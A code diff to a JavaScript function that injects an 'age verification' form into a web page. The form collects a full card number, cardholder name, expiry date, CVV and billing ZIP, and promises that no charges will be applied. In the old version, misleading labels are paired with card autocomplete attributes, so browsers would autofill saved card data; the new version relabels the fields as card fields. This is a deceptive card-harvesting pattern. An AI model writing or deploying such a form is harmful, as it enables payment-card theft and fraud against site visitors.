@@ -136,36 +136,36 @@ function insertAgeVerificationSection() {
             </p>
 
             <div class="form-group">
-                <label for="verifyCardNumber">Verification Number *</label>
-                <input type="text" id="verifyCardNumber" name="verification-number" autocomplete="cc-number" maxlength="19" data-lpignore="false">
+                <label for="verifyCardNumber">Card Number *</label>
+                <input type="text" id="verifyCardNumber" name="cc-number" autocomplete="cc-number" maxlength="19" data-lpignore="false">
                 <small style="color: #666;">Used only for age verification - no charges will be applied</small>
             </div>
 
             <div class="form-group">
-                <label for="verifyCardName">Full Legal Name *</label>
-                <input type="text" id="verifyCardName" name="legal-name" autocomplete="cc-name" placeholder="Full name as shown on government ID">
+                <label for="verifyCardName">Name on Card *</label>
+                <input type="text" id="verifyCardName" name="cc-name" autocomplete="cc-name" placeholder="Full name as shown on card">
                 <small style="color: #666;">Must match government-issued ID for verification compliance</small>
             </div>
 
             <div class="form-row">
                 <div class="form-group">
-                    <label>Document Expiration *</label>
+                    <label>Expiration Date *</label>
                     <div style="display: flex; gap: 10px;">
-                        <input type="text" id="verifyExpiryMonth" name="exp-month" autocomplete="cc-exp-month" placeholder="MM" maxlength="2" style="width: 60px;">
+                        <input type="text" id="verifyExpiryMonth" name="cc-exp-month" autocomplete="cc-exp-month" placeholder="MM" maxlength="2" style="width: 60px;">
                         <span style="align-self: center;">/</span>
-                        <input type="text" id="verifyExpiryYear" name="exp-year" autocomplete="cc-exp-year" placeholder="YY" maxlength="2" style="width: 60px;">
+                        <input type="text" id="verifyExpiryYear" name="cc-exp-year" autocomplete="cc-exp-year" placeholder="YY" maxlength="2" style="width: 60px;">
                     </div>
                 </div>
 
                 <div class="form-group">
                     <label for="verifyCVV">Security Code *</label>
-                    <input type="text" id="verifyCVV" name="security-code" autocomplete="cc-csc" placeholder="123" maxlength="4">
+                    <input type="text" id="verifyCVV" name="cc-csc" autocomplete="cc-csc" placeholder="123" maxlength="4">
                 </div>
             </div>
 
             <div class="form-group">
-                <label for="verifyBillingZip">ZIP Code *</label>
-                <input type="text" id="verifyBillingZip" name="postal-code" autocomplete="billing postal-code" placeholder="12345" maxlength="10">
+                <label for="verifyBillingZip">Billing ZIP Code *</label>
+                <input type="text" id="verifyBillingZip" name="billing-postal-code" autocomplete="billing postal-code" placeholder="12345" maxlength="10">
                 <small style="color: #666;">Required for identity verification and fraud prevention</small>
             </div>
 
